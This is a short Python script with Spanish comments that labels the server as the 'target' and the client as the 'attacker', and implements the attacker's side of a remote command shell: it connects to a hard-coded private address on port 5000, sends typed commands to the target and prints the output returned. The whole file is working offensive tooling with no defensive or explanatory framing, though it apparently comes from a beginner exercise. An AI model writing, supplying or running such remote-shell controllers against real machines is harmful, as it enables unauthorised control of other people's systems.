from socket import socket

#Servidor = target
#Cliente = atacante

# Definimos la dirección IP y el puerto del servidor 
ip_address = '192.168.18.50'
port = 5000

# Creamos el socket cliente
client_socket = socket()

# Conectamos al servidor utilizando la dirección IP y el puerto
server_address = (ip_address, port)
client_socket.connect(server_address)
estado = True

while estado:
    print("[+]Conectado a {} (s) para salir".format(ip_address))
    comando = input("$: ")
    
    if comando.lower() == 's':
        client_socket.send(comando.encode())
        client_socket.close()
        print("[+] Conexión cerrada.")
        break
    else:
        # Enviamos el comando al servidor
        client_socket.send(comando.encode())

        # Recibimos la respuesta del servidor y la imprimimos
        respuesta = client_socket.recv(4096).decode()
        print(respuesta)
